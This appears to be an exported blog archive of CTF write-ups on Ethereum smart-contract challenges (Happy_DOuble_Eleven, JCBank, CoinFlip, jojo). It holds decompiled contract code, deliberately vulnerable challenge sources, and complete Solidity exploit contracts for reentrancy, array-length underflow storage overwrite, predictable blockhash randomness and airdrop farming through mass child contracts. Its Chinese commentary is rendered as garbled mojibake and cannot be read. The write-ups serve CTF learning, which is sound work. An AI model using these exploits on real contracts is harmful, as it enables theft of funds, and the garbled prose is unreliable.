+= 1 ï¼Œ storage[0x06] += 1 123456789101112131415161718192021222324function gift() &#123; var var0 = address(msg.sender).code.length; if (var0 != 0x00) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x00) &#123; revert(memory[0x00:0x00]); &#125; if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; storage[keccak256(memory[0x00:0x40])] = 0x64; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] + 0x01; &#125; 0x23de8635 func_06CE(arg0) è¿™é‡Œæ˜¯è°ƒç”¨äº† 0xa8286aca çš„ function æ€»ä½“æ¥çœ‹ï¼Œè¿™é‡Œè°ƒç”¨äº† 0xa8286aca ä¸¤æ¬¡ï¼Œè¾“å…¥åŒæ ·çš„å‚æ•° arg0 ä¸€æ¬¡ï¼Œ 0xa8286aca ç¬¬ä¸€æ¬¡å’Œç¬¬äºŒæ¬¡è¿”å›žçš„ç»“æžœä¸ä¸€æ ·ï¼Œä½†æ˜¯ä¸€ä¸ª function å½“å®ƒçš„å‚æ•°ç¡®å®šæ—¶ï¼Œä»–çš„è¿”å›žç»“æžœä¹Ÿåº”è¯¥æ˜¯ç¡®å®šçš„ï¼Œè€Œä¸ä¼šä¸¤æ¬¡ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ 0xa8286aca è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæŽ¥å£å‡½æ•°ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥æ”¹å†™çš„ï¼Œæœ€åŽæ”¹å˜äº† storage[0x02] çš„å€¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function func_06CE(var arg0) &#123; var var0 = msg.sender; var var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var var2 = 0xa8286aca; var temp0 = memory[0x40:0x60]; memory[temp0:temp0 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000; var temp1 = temp0 + 0x04; memory[temp1:temp1 + 0x20] = arg0; var var3 = temp1 + 0x20; var var4 = 0x20; var var5 = memory[0x40:0x60]; var var6 = var3 - var5; var var7 = var5; var var8 = 0x00; var var9 = var1; var var10 = !address(var9).code.length; if (var10) &#123; revert(memory[0x00:0x00]); &#125; var temp2; temp2, memory[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(memory[var7:var7 + var6]); var4 = !temp2; if (!var4) &#123; var1 = memory[0x40:0x60]; var2 = returndata.length; if (var2 &lt; 0x20) &#123; revert(memory[0x00:0x00]); &#125; if (memory[var1:var1 + 0x20]) &#123; label_0850: return; &#125; else &#123; storage[0x03] = arg0; var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var2 = 0xa8286aca; var temp3 = memory[0x40:0x60]; memory[temp3:temp3 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000; var temp4 = temp3 + 0x04; memory[temp4:temp4 + 0x20] = storage[0x03]; var3 = temp4 + 0x20; var4 = 0x20; var5 = memory[0x40:0x60]; var6 = var3 - var5; var7 = var5; var8 = 0x00; var9 = var1; var10 = !address(var9).code.length; if (var10) &#123; revert(memory[0x00:0x00]); &#125; var temp5; temp5, memory[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(memory[var7:var7 + var6]); var4 = !temp5; if (!var4) &#123; var1 = memory[0x40:0x60]; var2 = returndata.length; if (var2 &lt; 0x20) &#123; revert(memory[0x00:0x00]); &#125; storage[0x02] = !!memory[var1:var1 + 0x20] | (storage[0x02] &amp; ~0xff); goto label_0850; &#125; else &#123; var temp6 = returndata.length; memory[0x00:0x00 + temp6] = returndata[0x00:0x00 + temp6]; revert(memory[0x00:0x00 + returndata.length]); &#125; &#125; &#125; else &#123; var temp7 = returndata.length; memory[0x00:0x00 + temp7] = returndata[0x00:0x00 + temp7]; revert(memory[0x00:0x00 + returndata.length]); &#125;&#125; 0x9189fec1 guess(uint256) è¦æ±‚ arg0 == block.blockHash(block.number - 0x01) % 3 ï¼Œè¿™ä¸ªå¾ˆå®¹æ˜“æ»¡è¶³ï¼Œå› ä¸ºåˆ©ç”¨åŒºå—å·ç”Ÿæˆçš„éšæœºæ•°æ˜¯å¯é¢„æµ‹çš„ æ»¡è¶³è¦æ±‚åŽï¼Œstorage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14 ï¼Œå³ storage[0x00] çš„é«˜ 96 ä½æ•°å€¼ä¸º1 1234567891011121314function guess(var arg0) &#123; var var1 = 0x00; var var0 = block.blockHash(block.number - 0x01); var var2 = 0x03; var var3 = var0; if (!var2) &#123; assert(); &#125; var1 = var3 % var2; if (var1 != arg0) &#123; return; &#125; storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14;&#125; 0xa6f2ae3a buy() è¦æ±‚ storage[0x06] == 1 ï¼Œè¿™äº›è°ƒç”¨ gift() ç©ºæŠ•å¯ä»¥å®Œæˆ è¦æ±‚ storage[0x05] == 1 ï¼Œè¿™äº›è°ƒç”¨ gift() ç©ºæŠ•å¯ä»¥å®Œæˆ è¦æ±‚ storage[02] == 1 ï¼Œç»“åˆ func_06CE æ¥çœ‹ï¼Œåªéœ€ä½¿å¾— 0xa8286aca ç¬¬äºŒæ¬¡è°ƒç”¨è¿”å›ž 1 å³å¯ è¦æ±‚ storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 1 ï¼Œå³ storage[0x00] çš„é«˜ 96 ä½æ•°å€¼è¦æ±‚ä¸º 1 ï¼Œè¿™ä¸ªæ»¡è¶³ guess å³å¯ æ»¡è¶³ä¸Šè¿°è¦æ±‚åŽï¼Œstorage[0x05] += 1 ï¼Œstorage[0x06] += 1 123456789101112131415161718192021222324function buy() &#123; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x02] &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] + 0x01;&#125; 0x47f57b32 retract() è¦æ±‚ storage[0x01] == 0 è¦æ±‚ storage[0x05] == 0x02 ï¼Œè°ƒç”¨ gift åŽï¼Œå†è°ƒç”¨ buy å³å¯ è¦æ±‚ storage[0x06] == 0x02 ï¼Œè°ƒç”¨ gift åŽï¼Œå†è°ƒç”¨ buy å³å¯ è¦æ±‚ storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ï¼Œå³ storage[0x00] çš„é«˜ 96 ä½æ•°å€¼è¦æ±‚ä¸º 1 ï¼Œè¿™ä¸ªæ»¡è¶³ guess å³å¯ æ»¡è¶³ä¸Šè¿°è¦æ±‚ä¹‹åŽï¼Œstorage[0x01] -= 0x1 ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¿®æ”¹æ•°ç»„çš„é•¿åº¦ 123456789101112131415161718192021function retract() &#123; if (storage[0x01] != 0x00) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; var var0 = storage[0x01] - 0x01; var var1 = 0x0cf4; var var2 = 0x01; var var3 = var0; func_1489(var2, var3);&#125; 0x0339f300 revise(uint256,bytes32) è¦æ±‚ storage[0x01] &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000 ï¼Œç»è¿‡ retract() åŽå³å¯æ»¡è¶³ è¦æ±‚ storage[0x05] == 0x02 ï¼Œ è¦æ±‚ storage[0x06] == 0x02 ï¼Œ è¦æ±‚ storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ï¼Œå³ storage[0x00] çš„é«˜ 96 ä½æ•°å€¼è¦æ±‚ä¸º 1 ï¼Œè¿™ä¸ªæ»¡è¶³ guess å³å¯ è¦æ±‚ arg0 &gt;= storage[0x01] æ»¡è¶³ä¸Šè¿°è¦æ±‚åŽï¼ŒåŽé¢è¿›è¡Œäº† storage å†™æ“ä½œï¼Œè¿™é‡Œæ˜¯ä»»æ„å†™æ“ä½œ 123456789101112131415161718192021222324252627282930313233343536373839function revise(var arg0, var arg1) &#123; if (storage[0x01] &lt; 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; var var0 = arg1; var var1 = 0x01; var var2 = arg0; if (var2 &gt;= storage[var1]) &#123; assert(); &#125; memory[0x00:0x20] = var1; storage[keccak256(memory[0x00:0x20]) + var2] = var0; if (storage[0x01] &gt;= 0xffffffffff000000000000000000000000000000000000000000000000000000) &#123; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; return; &#125; else &#123; var0 = 0x00; var1 = 0x0676; var2 = 0x01; var var3 = var0; func_1489(var2, var3); revert(memory[0x00:0x00]); &#125;&#125; 0xa9059cbb transfer(address,uint256) è¿™é‡Œæ˜¯è¿›è¡Œ storage[0x04] ä¹‹é—´çš„è½¬è´¦æ“ä½œ 123456789function transfer(var arg0, var arg1) returns (var r0) &#123; var var0 = 0x00; var var1 = 0x11d7; var var2 = msg.sender; var var3 = arg0; var var4 = arg1; func_126F(var2, var3, var4); return 0x01;&#125; 0x2e1a7d4d withdraw(uint256) è¦æ±‚ storage[0x05] == 0x02 è¦æ±‚ storage[0x06] == 0x03 è¦æ±‚é€€æ¬¾æ¯æ¬¡ &lt; 100 è¦æ±‚ storage[0x04] &lt; arg0ï¼Œå³ä½™é¢æ¯”æ¯æ¬¡é€€æ¬¾è¦å¤š è¦æ±‚åˆçº¦ä½™é¢æ¯”é€€æ¬¾è¦å¤š æ»¡è¶³æ¡ä»¶åŽï¼Œstorage[0x04] -= arg0 ï¼Œç„¶åŽè°ƒç”¨ call å‡½æ•°è¿›è¡Œè½¬è´¦ï¼ˆè¿™é‡Œå­˜åœ¨é‡å…¥æ”»å‡»ï¼Œå› ä¸ºæ²¡æœ‰å¯¹ gas åšæŽ§åˆ¶ï¼‰ï¼Œæœ€åŽ storage[0x05] -= 0x01 12345678910111213141516171819202122232425262728293031323334function withdraw(var arg0) &#123; if (msg.sender != storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x03) &#123; revert(memory[0x00:0x00]); &#125; if (arg0 &lt; 0x64) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; if (storage[keccak256(memory[0x00:0x40])] &lt; arg0) &#123; revert(memory[0x00:0x00]); &#125; if (address(address(this)).balance &lt; arg0) &#123; revert(memory[0x00:0x00]); &#125; var temp0 = arg0; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] - temp0; var temp2 = memory[0x40:0x60]; memory[temp2:temp2 + 0x00] = address(msg.sender).call.gas(msg.gas).value(temp0)(memory[temp2:temp2 + memory[0x40:0x60] - temp2]); memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp3 = keccak256(memory[0x00:0x40]); storage[temp3] = storage[temp3] - 0x01;&#125; åˆ†æž é€šè¿‡ä¸Šé¢çš„åˆ†æžåŽï¼Œè¿™æ ·æ•´ä¸ªæ”»å‡»é“¾å°±å‡ºæ¥äº† ç”Ÿæˆç¬¦åˆè¦æ±‚çš„å¤–éƒ¨è´¦æˆ·ï¼Œåœ¨ constructor ä¸­è°ƒç”¨ gift() è°ƒç”¨ 0x23de8635 func_06CE ï¼Œè¿™é‡Œè¦åˆ©ç”¨ bytecode çš„æ–¹å¼éƒ¨ç½²ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ func_06CE ä¸­è°ƒç”¨çš„æŽ¥å£å‡½æ•° 0xa8286aca çš„å‡½æ•°åï¼Œæ‰€ä»¥åˆ©ç”¨ bytecode çš„æ–¹å¼éƒ¨ç½²ç¬¬ä¸‰æ–¹åˆçº¦ï¼Œå°† fake(uint256) å¯¹åº”çš„å‡½æ•°é€‰æ‹© id æ”¹ä¸º 0xa8286aca å³å¯ï¼Œè¿™æ ·è°ƒç”¨ 0xa8286aca å°±æ˜¯è°ƒç”¨æˆ‘ä»¬é‡å†™ä¹‹åŽçš„ 0xa8286aca äº†ï¼Œç”¨ bytecode éƒ¨ç½²å¯ä»¥ç”¨åœ¨çº¿çš„ myetherwallet.com è°ƒç”¨ guess() ï¼Œç„¶åŽè°ƒç”¨ buy() è°ƒç”¨ retract() å’Œ revise() ä¿®æ”¹ owner éƒ¨ç½²ç¬¬ä¸‰æ–¹å­åˆçº¦ï¼Œç¬¬ä¸‰æ–¹å­åˆçº¦è°ƒç”¨ gift() å’Œ transfer() ç»™æ”»å‡»åˆçº¦è½¬è´¦ï¼Œç„¶åŽè°ƒç”¨ withdraw() è¿›è¡Œé‡å…¥æ”»å‡» æœ€åŽè°ƒç”¨ payforflag å³å¯ exp å¤–éƒ¨è´¦æˆ·æ»¡è¶³å…¶éƒ¨ç½²çš„ç¬¬ä¸€ä¸ªåˆçº¦åœ°å€æœ€åŽ 12 ä½æ˜¯ 0x111 å¯ä»¥ç”¨ä¸‹è¿°è„šæœ¬ç”Ÿæˆï¼Œgenerate_eoa1() æ˜¯ç”Ÿæˆå¤–éƒ¨è´¦æˆ·æœ€åŽ 12 ä½ä¸º 0x111 ï¼Œgenerate_eoa2() æ˜¯ç”Ÿæˆæ»¡è¶³å¤–éƒ¨è´¦æˆ·éƒ¨ç½²çš„ç¬¬ä¸€ä¸ªåˆçº¦æœ€åŽ 12 ä½æ˜¯ 0x111 ï¼Œæˆ‘ä»¬ç”¨ generate_eoa2() å³å¯ 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("111"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("111"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument") expå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172pragma solidity ^0.4.23;contract hack &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; uint have_withdraw = 0; int cnt = 0; constructor() payable &#123; // gift() address(instance_address).call(bytes4(0x24b04905)); &#125; function step1() public &#123; // storage[0x02] == 1 address(instance_address).call(bytes4(0x23de8635), 0); &#125; function fake(uint256 _i) public returns(uint256) &#123; if(cnt == 1) &#123; return 1; &#125; cnt = 1; return 0; &#125; function step2() public &#123; // guess(uint256) uint256 v = uint256(block.blockhash(block.number-1)) % 3; address(instance_address).call(bytes4(0x9189fec1), v); // buy() address(instance_address).call(bytes4(0xa6f2ae3a)); &#125; function step3() public &#123; // retract() assert(address(instance_address).call(bytes4(0x47f57b32))); &#125; function step4() public &#123; // revise(uint256,bytes32) uint256 solt = 2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6; address(instance_address).call(bytes4(0x0339f300), solt, 2**160 + uint256(address(this))); &#125; function step5() public &#123; // withdraw address(instance_address).call(bytes4(0x2e1a7d4d), 100); &#125; function() payable &#123; if (have_withdraw &lt;=2 &amp;&amp; msg.sender == instance_address) &#123; have_withdraw += 1; address(instance_address).call(bytes4(0x2e1a7d4d), 100); &#125; &#125; function step6(string b64email) public &#123; address(instance_address).call(bytes4(0x6bc344bc), b64email); &#125;&#125;contract son &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; constructor() payable &#123; // gift() address(instance_address).call(bytes4(0x24b04905)); // transfer address(instance_address).call(bytes4(0xa9059cbb), address(0x2db8f907965a5742f16f82cddced585f8bc04111), 100); &#125;&#125; Source æœ€åŽé™„ä¸Šåˆçº¦æºä»£ç åŠå…¶å·²çŸ¥æºä»£ç çš„ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209pragma solidity ^0.4.23;interface Tmall &#123; function Chop_hand(uint) view public returns (bool);&#125;contract Happy_DOuble_Eleven &#123; address public owner; bool public have_money; bytes32[] public codex; bool public have_chopped; uint public hand; mapping (address =&gt; uint) public balanceOf; mapping (address =&gt; uint) public mycart; mapping (address =&gt; uint) public level; event pikapika_SendFlag(string b64email); constructor() public &#123; owner = msg.sender; &#125; function payforflag(string b64email) onlyOwner public &#123; require(uint(msg.sender) &amp; 0xfff == 0x111); require(level[msg.sender] == 3); require(mycart[msg.sender] &gt; 10000000000000000000); balanceOf[msg.sender] = 0; level[msg.sender] = 0; have_chopped = false; have_money = false; codex.length = 0; emit pikapika_SendFlag(b64email); &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; modifier first() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function Deposit() public payable &#123; if(msg.value &gt;= 500 ether)&#123; mycart[msg.sender] += 1; &#125; &#125; function gift() first &#123; require(mycart[msg.sender] == 0); require(uint(msg.sender) &amp; 0xfff == 0x111); balanceOf[msg.sender] = 100; mycart[msg.sender] += 1; level[msg.sender] += 1; &#125; function Chopping(uint _hand) public &#123; Tmall tmall = Tmall(msg.sender); if (!tmall.Chop_hand(_hand)) &#123; hand = _hand; have_chopped = tmall.Chop_hand(hand); &#125; &#125; function guess(uint num) public &#123; uint seed = uint(blockhash(block.number - 1)); uint rand = seed % 3; if (rand == num) &#123; have_money = true; &#125; &#125; function buy() public &#123; require(level[msg.sender] == 1); require(mycart[msg.sender] == 1); require(have_chopped == true); require(have_money == true); mycart[msg.sender] += 1; level[msg.sender] += 1; &#125; function retract() public &#123; require(codex.length == 0); require(mycart[msg.sender] == 2); require(level[msg.sender] == 2); require(have_money == true); codex.length -= 1; &#125; function revise(uint i, bytes32 _person) public &#123; require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000); require(mycart[msg.sender] == 2); require(level[msg.sender] == 2); require(have_money == true); codex[i] = _person; if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123; codex.length = 0; revert(); &#125; else&#123; level[msg.sender] += 1; &#125; &#125; function withdraw(uint _amount) onlyOwner public &#123; require(mycart[msg.sender] == 2); require(level[msg.sender] == 3); require(_amount &gt;= 100); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); balanceOf[msg.sender] -= _amount; msg.sender.call.value(_amount)(); mycart[msg.sender] -= 1; &#125;&#125;contract hack &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; Happy_DOuble_Eleven target = Happy_DOuble_Eleven(instance_address); bool public flag = true; uint have_withdraw = 0; constructor() payable &#123; target.gift(); &#125; function Chop_hand(uint) public returns (bool)&#123; flag = !flag; return flag; &#125; function step1() public &#123; target.Chopping(123); &#125; function step2() public &#123; uint seed = uint(blockhash(block.number - 1)); uint rand = seed % 3; target.guess(rand); target.buy(); &#125; function step3() public &#123; target.retract(); &#125; function step4(uint i, bytes32 _person) public &#123; target.revise(i, _person); &#125; function step5() public &#123; target.withdraw(100); &#125; function() payable &#123; if (have_withdraw &lt;=2 &amp;&amp; msg.sender == instance_address) &#123; have_withdraw += 1; target.withdraw(100); &#125; &#125; function step6(string b64email) public &#123; target.payforflag(b64email); &#125;&#125;contract son &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; Happy_DOuble_Eleven target = Happy_DOuble_Eleven(instance_address); constructor() payable &#123; target.gift(); target.transfer(address(0x9e9d7445a3851aa38f70383301d5e7f39fa03111), 100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>xctf final</tag>
        <tag>Happy_DOuble_Eleven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hackergame2019 JCBank]]></title>
    <url>%2F2019%2FJCBank%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ä»¥å¤ªåŠ Kovan æµ‹è¯•é“¾ åˆçº¦åœ°å€ï¼šhttps://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 é¢˜ç›®ï¼šhttps://github.com/hitcxy/blockchain-challenges/tree/master/2019/Hackergame/JCBank ä¸¤ä¸ª flag : get_flag_1 get_flag_2 get_flag_1 è¯»å– storage å˜é‡ secret çš„å€¼å³å¯ï¼Œå…¶å€¼ä¸º 0x175bddc0da1bd47369c47861f48c8ac ï¼Œè°ƒç”¨ get_flag_1 å³å¯ 1234567891011var Web3=require("web3");if (typeof web3 !== 'undefined') &#123; web3 = new Web3(web3.currentProvider);&#125; else &#123; web3 = new Web3(new Web3.providers.HttpProvider("https://kovan.infura.io/v3/b38f10b5036f4e6691fcc690461097d1"));&#125;var address="0xE575c9abD35Fa94F1949f7d559056bB66FddEB51";web3.eth.getStorageAt(address, 0, function(x,y)&#123;console.info(y)&#125;);web3.eth.getStorageAt(address, 1, function(x,y)&#123;console.info(y)&#125;);web3.eth.getStorageAt(address, 2, function(x,y)&#123;console.info(y)&#125;); get_flag_2 åˆ©ç”¨ Reentrancy å’Œ æ•´åž‹ä¸‹æº¢ 123456789101112131415161718192021222324252627282930313233contract hack &#123; address instance_address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51; JCBank target = JCBank(instance_address); uint public have_withdraw = 0; string public s; constructor() public payable &#123;&#125; function attack() public &#123; target.deposit.value(0.1 ether)(); &#125; function attack1(uint128 guess) public &#123; s=target.get_flag_1(guess); &#125; function attack2() public &#123; if(have_withdraw == 1)&#123; target.get_flag_2(155418233698); &#125; &#125; function attack3() public &#123; target.withdraw(0.1 ether); &#125; function() payable &#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(0.1 ether); &#125; &#125;&#125; attack å­˜å…¥ä¸€ç‚¹é‡‘é¢ï¼Œattack3 é‡å…¥æ”»å‡»ä¸¤æ¬¡ï¼Œ attack2 è°ƒç”¨ get_flag_2 å³å¯]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Hackergame</tag>
        <tag>JCBank</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RoarCTF2019 CoinFlip]]></title>
    <url>%2F2019%2FCoinFlip%2F</url>
    <content type="text"><![CDATA[å‰è¨€ RoarCTF2019 çš„ CoinFlip é¢˜ç›® é¢˜ç›®ï¼šhttps://github.com/hitcxy/blockchain-challenges/tree/master/2019/RoarCTF/CoinFlip Deposit() å¯ä»¥å¢žåŠ  balances[msg.sender] ï¼Œä½†æ˜¯éœ€è¦å‘é€ msg.value &gt; 500 ether æ‰èƒ½æ»¡è¶³è¦æ±‚ï¼Œå¯ä»¥å†™è‡ªåŠ¨åŒ–è„šæœ¬å®Œæˆï¼ˆä½†è¿™æ ·çš„è¯ï¼Œé¢˜ç›®åº”è¯¥æ˜¯éžé¢„æœŸï¼Œé¢˜ç›®è€ƒç‚¹åº”è¯¥ä¸æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥ç†è®ºå¯è¡Œï¼Œè¯·è‡ªè¡Œå°è¯•ï¼‰ è–…ç¾Šæ¯›æ”»å‡»: éƒ¨ç½²ç¬¬ä¸‰æ–¹è‡ªåˆçº¦ï¼Œç„¶åŽè°ƒç”¨ Ap() å’Œ Transfer() å°†é’±è½¬åˆ°å›ºå®šåœ°å€ å›ºå®šåœ°å€è°ƒç”¨ CaptureTheFlag å³å¯ 12345678910111213141516171819202122232425contract hack &#123; address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21; P_Bank target = P_Bank(instance_address); function hack1(string b64email) public &#123; target.CaptureTheFlag(b64email); &#125;&#125;contract father &#123; function createsons() &#123; for (uint i=0;i&lt;101;i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public &#123; P_Bank tmp = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21); tmp.Ap(); tmp.Transfer(0x7ec9f720a8d59bc202490c690139f8c7cbad568d, 1 ether); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>RoarCTF2019</tag>
        <tag>CoinFlip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ•°å­—ç»æµŽ2019 jojo]]></title>
    <url>%2F2019%2Fjojo%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æ•°å­—ç»æµŽäº‘å®‰å…¨ä¼—æµ‹å¤§èµ› 2019 ï¼Œä¸€é“åŒºå—é“¾é¢˜ç›® é¢˜ç›®ï¼šé™„ä»¶ä¸‹è½½ éœ€è¦é€†å‘ æ»¡è¶³ require å³å¯ 1234function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 100000); emit SendFlag(b64email);&#125; gift ç©ºæŠ•å‡½æ•° 12345function gift() public &#123; assert(gift[msg.sender]==0); balanceOf[msg.sender]+=100; gift[msg.sender]=1;&#125; è½¬è´¦å‡½æ•° 12345function transfer(address to,uint value) public &#123; assert(balanceOf[msg.sender] &gt;= value); balanceOf[msg.sender]-=value; balanceOf[to]+=value;&#125; è½¬è´¦å‡½æ•°æ— æ³•æ•´åž‹æº¢å‡ºï¼Œæ‰€ä»¥éœ€è¦å¦æƒ³åŠžæ³• è–…ç¾Šæ¯›æ”»å‡»ï¼šé€šè¿‡å»ºç«‹å¤šä¸ªè‡ªåˆçº¦é¢†å–ç©ºæŠ•ï¼Œç„¶åŽè½¬è´¦ç»™å›ºå®šè´¦æˆ·å³å¯å®Œæˆæ”»å‡» payforflag 12345678910111213141516171819202122232425contract hack &#123; address instance_address = 0xd86ed76112295a07c675974995b9805912282eb3; jojo target = jojo(instance_address); function hack1(string b64email) public &#123; target.payforflag(b64email); &#125;&#125;contract father &#123; function attack() public &#123; for (uint i=0; i&lt;50; i++) &#123; son ason = new son(); 